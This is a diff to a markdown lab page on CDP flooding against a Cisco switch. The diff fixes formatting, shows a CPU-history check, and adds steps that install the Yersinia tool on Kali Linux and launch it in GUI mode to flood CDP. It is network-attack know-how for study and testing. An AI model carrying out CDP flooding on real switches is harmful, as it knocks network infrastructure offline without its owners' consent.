@@ -27,8 +27,8 @@ title: CDP flooding
         Sending a holdtime value of 180 seconds
         Sending CDPv2 advertisements is enabled
     Switch#
-    ````
-    2. Check the CPU of the Cisco device
+    ```
+    2. Check the CPU usage of the Cisco device
     ```
     Switch#show processes cpu history
 
@@ -48,6 +48,18 @@ title: CDP flooding
                    0    5    0    5    0    5    0    5    0    5    0
                    CPU% per second (last 60 seconds)
     ```
-    
+    3. Install Yersinia on Kali Linux (if necessary)
+    ```
+    root@kali:~# apt-get update
+    root@kali:~# apt-get upgrade
+    root@kali:~# apt-get install yersinia
+    ```
+    4. Launching CDP flooding
+    ```
+    root@kali:~# yersinia -G
+    ```
+
+
+
 
 
